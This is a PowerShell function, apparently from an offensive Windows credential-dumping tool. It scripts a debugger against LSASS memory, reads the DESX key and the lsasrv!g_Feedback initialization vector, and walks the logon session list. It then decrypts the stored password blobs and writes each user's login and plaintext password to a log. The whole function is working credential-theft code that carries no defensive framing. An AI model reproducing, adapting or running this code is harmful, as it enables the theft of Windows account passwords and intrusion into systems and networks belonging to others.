function Get-ObsoleteSystemsInformations ($buffer, $fullScriptPath) {   

    if($mode -eq 3) {
        $chain15 = White-Rabbit2
        $chain =  White-RabbitObs1  
        Write-InFile $buffer $chain         
        $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath   
        $arrayFirstAddress = ($tab -split ' ')    
        $foundInstruction = [array]::indexof($arrayFirstAddress,$chain42) + 4
        $firstAddress1 = $arrayFirstAddress[$foundInstruction]    
        $foundInstruction = [array]::indexof($arrayFirstAddress,$chain42) + 5
        $firstAddress2 = $arrayFirstAddress[$foundInstruction]    
        $firstAddress = "$firstAddress2$firstAddress1"         
        $int = 96
        $slashC = "/c"
        $chain = "$chain15 $slashC $int $firstAddress L48"      
        Write-InFile $buffer $chain         
        $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath                                 
        $arrayDesXAddressAddress = ($tab -split ' ')                              
        $passAddress1 = ""
        $j = 0
        $start = 7
        $keyAddress = ""
        while($j -le 71) {
            if($j -eq 0) {
                $value = $start
                $comma = ""
            }
            else {        
                $value++
                $comma = " "                
            }            
            $foundInstruction = [array]::indexof($arrayDesXAddressAddress,"dw") + $value                        
            $keyAddress2 = $arrayDesXAddressAddress[$foundInstruction].Substring(0,2)                      
            $keyAddress1 = $arrayDesXAddressAddress[$foundInstruction].Substring(2,2)                                  
            $keyAddress += "$keyAddress1$keyAddress2"
            $j++
        }                 
        $DESXKeyHex = $keyAddress     
        $initializationVectorCommand = "db lsasrv!g_Feedback"                  
        [io.file]::WriteAllText($buffer, $initializationVectorCommand) | Out-Null                                                                                                                                      
        $initializationVector = &$memoryWalker -z $file -c "`$`$<$fullScriptPath;Q" 

        $arrayInitializationVector = ($initializationVector -split ' ')    

        $j = 0
        $initializationVectorAddress = ""
        $start = 4
        while($j -le 7) {
            if($j -eq 0) {
                $value = $start
                $comma = ""
            }
            else {        
                $value++
                $comma = ", "        
            }
            $foundInstruction = [array]::indexof($arrayInitializationVector,"db") + $value   
            if($j -eq 7) {
                $initializationVectorAddress1 = $arrayInitializationVector[$foundInstruction].Substring(0,2)
            }
            else {
                $initializationVectorAddress1 = $arrayInitializationVector[$foundInstruction]
            }
            $initializationVectorAddress += "$initializationVectorAddress1"
            $j++
        }   

        $g_Feedback = $initializationVectorAddress        
        
        $Encoding = [System.Text.Encoding]::GetEncoding("windows-1252")

        $hexarray = $g_Feedback -split '(.{2})' | ? {$_}
        $hexcount = $hexarray.count
        $loopcount = 0
        $g_Feedback = ""
        while ($loopcount -le $hexcount -1) {
            $currenthex = $hexarray[$loopcount]          
            $dec = [Convert]::ToInt32($currenthex,16)    
            $String = $Encoding.GetString($dec)
            $conversion = [Char][Convert]::ToInt32($currenthex,16)    
            $g_Feedback = $g_Feedback + $String
            $loopcount = $loopcount + 1
        }        
        $hexarray = $DESXKeyHex -split '(.{2})' | ? {$_}
        $hexcount = $hexarray.count
        $loopcount = 0
        $DESXKeyHex = ""
        while ($loopcount -le $hexcount -1) {
            $currenthex = $hexarray[$loopcount]          
            $dec = [Convert]::ToInt32($currenthex,16)    
            $String = $Encoding.GetString($dec)
            $conversion = [Char][Convert]::ToInt32($currenthex,16)    
            $DESXKeyHex = $DESXKeyHex + $String
            $loopcount = $loopcount + 1
        }

        $chain = White-RabbitOrWhat   
        Write-InFile $buffer $chain         
        $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath                     

        $firstAddress = ""
        $arrayFirstAddress = ($tab -split ' ')    
        $foundInstruction = [array]::indexof($arrayFirstAddress,$chain42) + 4
        $firstAddress1 = $arrayFirstAddress[$foundInstruction]
        $foundInstruction = [array]::indexof($arrayFirstAddress,$chain42) + 5
        $firstAddress2 = $arrayFirstAddress[$foundInstruction]    
        $firstAddress = "$firstAddress2$firstAddress1"         
        $firstAddressList = $firstAddress
        $nextEntry = ""
        $i = 0
        while ($firstAddressList -ne $nextEntry) {
            if($i -eq 0) {
                $nextEntry = $firstAddress                
                $command = "$chain42 $firstAddress"  
            }
            else {                 
                $command = "$chain42 $nextEntry"    
            }
                           
            Write-InFile $buffer $command         
            $ddSecond = Call-MemoryWalker $memoryWalker $file $fullScriptPath 

            if($i -eq 0) {
                $firstAddress = $firstAddress               
                $arrayNextEntryAddress = ($ddSecond -split ' ')    
                $foundInstruction = [array]::indexof($arrayNextEntryAddress,$chain42) + 4
                $nextEntry1 = $arrayNextEntryAddress[$foundInstruction]     
                $foundInstruction = [array]::indexof($arrayNextEntryAddress,$chain42) + 5
                $nextEntry2 = $arrayNextEntryAddress[$foundInstruction]    
                $nextEntry = "$nextEntry2$nextEntry1"                   
            }
            else {        
                $firstAddress = $nextEntry
                $arrayNextEntryAddress = ($ddSecond -split ' ')    
                $foundInstruction = [array]::indexof($arrayNextEntryAddress,$chain42) + 4
                $nextEntry1 = $arrayNextEntryAddress[$foundInstruction]     
                $foundInstruction = [array]::indexof($arrayNextEntryAddress,$chain42) + 5
                $nextEntry2 = $arrayNextEntryAddress[$foundInstruction]    
                $nextEntry = "$nextEntry2$nextEntry1"                
            }    

            Write-Progress -Activity "Getting valuable informations" -status "Running..." -id 1       
            $arrayLoginAddress = ($ddSecond -split ' ')           
            $start = 28                     
            $foundInstruction = [array]::indexof($arrayLoginAddress,$chain42) + $start
            $loginAddress1 = $arrayLoginAddress[$foundInstruction]             
            $loginAddress = "$loginAddress1"                            
            $ok = White-RabbitOK
            if($loginAddress -eq "00000000"){
                $start = 16                     
                $foundInstruction = [array]::indexof($arrayLoginAddress,$chain42) + $start
                $loginAddress1 = $arrayLoginAddress[$foundInstruction]             
                $loginAddress = "$loginAddress1"    
                
                $loginAddressCommand = "$ok $loginAddress"                  
                [io.file]::WriteAllText($buffer, $loginAddressCommand) | Out-Null
                $loginDB = &$memoryWalker -z $file -c "`$`$<$fullScriptPath;Q"

                $arrayloginDBAddress = ($loginDB -split ' ')            
                $foundInstruction = [array]::indexof($arrayloginDBAddress,"du") + 4
                $loginPlainText1 = $arrayloginDBAddress[$foundInstruction]
                $loginPlainText = $loginPlainText1
            }
            else {                
                $chain = "du $loginAddress"   
                Write-InFile $buffer $chain         
                $loginDB = Call-MemoryWalker $memoryWalker $file $fullScriptPath               
                                
                $arrayloginDBAddress = ($loginDB -split ' ')            
                $foundInstruction = [array]::indexof($arrayloginDBAddress,"du") + 4
                $loginPlainText1 = $arrayloginDBAddress[$foundInstruction]
                $loginPlainText = $loginPlainText1
            }     

            Write-Progress -Activity "Getting valuable informations" -status "Running..." -id 1       
            $arrayPasswordAddress = ($ddSecond -split ' ')                            
            $foundInstruction = [array]::indexof($arrayPasswordAddress,$chain42) + 19
            $lengthPassword = $arrayPasswordAddress[$foundInstruction]
            $lengthPassword = $lengthPassword.Substring(6,2)        
            $numberBytes = [int][Math]::Ceiling([System.Convert]::ToInt32($lengthPassword,16)/8) * 4                
            $foundInstruction = [array]::indexof($arrayPasswordAddress,$chain42) + 22
            $secondAddress1 = $arrayPasswordAddress[$foundInstruction]                
            $secondAddress = "$secondAddress1"   
            
            $chain = "$chain15 $secondAddress"                 
            Write-InFile $buffer $chain         
            $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath                
                   
            $arrayPasAddress = ($tab -split ' ')                  
            $passAddress1 = ""
            $passAddress2 = ""
            $j = 1
            $modJ = $j
            $begin = 4
            $stringPasswordHex = ""
            while($j -le $numberBytes -and $j -le 64) {        
                if($j -eq 1) {
                    $value = $begin
                    $comma = ""
                }
                else {
                    $goNextLine = $modJ%9            
                    if($goNextLine -eq 0) {
                        $value = $value+3
                        $comma = ", "
                        $modJ++
                    }
                    else {
                        $value++
                        $comma = ", "
                    }
                }
                $foundInstruction = [array]::indexof($arrayPasAddress,"$chain15") + $value                
                $passAddress2 = $arrayPasAddress[$foundInstruction].Substring(0,2)
                $passAddress1 = $arrayPasAddress[$foundInstruction].Substring(2,2)            
                $stringPasswordHex += "$passAddress1$passAddress2"
                $j++
                $modJ++
            }        

            $passwordHex = $stringPasswordHex                            
            Write-Log -streamWriter $global:streamWriter -infoToLog "Login : $loginPlainText"                        
            $cipherToDecrypt = $passwordHex                      
            $hexarray = $cipherToDecrypt -split '(.{2})' | ? {$_}
            if($hexarray){
                $hexcount = $hexarray.count
                $loopcount = 0
                $cipherToDecrypt = ""
                while ($loopcount -le $hexcount -1) {
                    $currenthex = $hexarray[$loopcount]          
                    $dec = [Convert]::ToInt32($currenthex,16)    
                    $String = $Encoding.GetString($dec)
                    $conversion = [Char][Convert]::ToInt32($currenthex,16)    
                    $cipherToDecrypt = $cipherToDecrypt + $String
                    $loopcount = $loopcount + 1
                }
            
                $passwordDec = Get-OldDec $DESXKeyHex $g_Feedback $cipherToDecrypt
                $passwordDecSplitted = $passwordDec -split " "
                $passwordDecSplitted = $passwordDecSplitted -replace " ",""
                $password = ""
                foreach($letter in $passwordDecSplitted){
                    if([int]$letter -lt 98182){
                        $password = $password + [char][int]$letter
                    }
                }            
                        
                Write-Log -streamWriter $global:streamWriter -infoToLog "Password : $password"
            }
            $i++
        }        
    }
}